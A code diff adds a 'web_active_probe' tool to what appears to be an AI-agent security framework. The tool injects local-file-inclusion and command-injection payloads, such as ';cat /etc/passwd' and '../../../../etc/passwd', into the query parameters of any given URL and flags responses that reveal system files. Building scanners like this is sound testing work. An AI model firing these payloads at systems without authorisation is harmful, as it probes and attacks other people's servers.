@@ -5411,6 +5411,95 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
 
         return result
 
+    @mcp.tool()
+    def web_active_probe(target_url: str, probe_type: str = "all") -> Dict[str, Any]:
+        """
+        Perform active vulnerability testing on target URL query parameters for LFI and OS Command Injection.
+
+        Args:
+            target_url: The full target URL with query parameters (e.g., http://target.com/vuln.php?param=value)
+            probe_type: The type of vulnerability to test (all, lfi, cmd_injection)
+
+        Returns:
+            Dict containing the vulnerability scan results and discovered findings.
+        """
+        import requests
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+        logger.info(f"🛡️  Starting active web probe on: {target_url} (Type: {probe_type})")
+        findings = []
+        parsed = urlparse(target_url)
+        query_params = parse_qs(parsed.query)
+
+        if not query_params:
+            return {
+                "success": True,
+                "target": target_url,
+                "message": "No query parameters found in the target URL to probe.",
+                "findings": []
+            }
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) HexStrike/7.0"
+        }
+
+        # Payloads
+        lfi_payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
+        cmd_payloads = [";cat /etc/passwd", ";ipconfig", "|dir"]
+
+        for param in query_params:
+            # 1. LFI Probe
+            if probe_type in ["all", "lfi"]:
+                for payload in lfi_payloads:
+                    modified_query = query_params.copy()
+                    modified_query[param] = [payload]
+                    query_string = urlencode(modified_query, doseq=True)
+                    test_url = urlunparse(parsed._replace(query=query_string))
+                    try:
+                        res = requests.get(test_url, headers=headers, timeout=5, verify=False)
+                        if "root:x:" in res.text or "[extensions]" in res.text or "[fonts]" in res.text:
+                            findings.append({
+                                "vulnerability": "Local File Inclusion (LFI)",
+                                "parameter": param,
+                                "payload": payload,
+                                "severity": "High",
+                                "description": f"The query parameter '{param}' is vulnerable to Local File Inclusion (LFI). System files were retrieved in the HTTP response body."
+                            })
+                            break
+                    except Exception as e:
+                        logger.debug(f"LFI probe exception for {param}: {str(e)}")
+
+            # 2. Command Injection Probe
+            if probe_type in ["all", "cmd_injection"]:
+                for payload in cmd_payloads:
+                    modified_query = query_params.copy()
+                    modified_query[param] = [payload]
+                    query_string = urlencode(modified_query, doseq=True)
+                    test_url = urlunparse(parsed._replace(query=query_string))
+                    try:
+                        res = requests.get(test_url, headers=headers, timeout=5, verify=False)
+                        if "root:x:" in res.text or "Windows IP Configuration" in res.text or "<DIR>" in res.text:
+                            findings.append({
+                                "vulnerability": "OS Command Injection",
+                                "parameter": param,
+                                "payload": payload,
+                                "severity": "Critical",
+                                "description": f"The query parameter '{param}' is vulnerable to OS Command Injection. System command execution signatures were detected in the response."
+                            })
+                            break
+                    except Exception as e:
+                        logger.debug(f"Command Injection probe exception for {param}: {str(e)}")
+
+        logger.info(f"✅ Web active probe finished. Discovered {len(findings)} vulnerability alerts.")
+        return {
+            "success": True,
+            "target": target_url,
+            "findings_count": len(findings),
+            "findings": findings
+        }
+
     return mcp
 
 def parse_args():
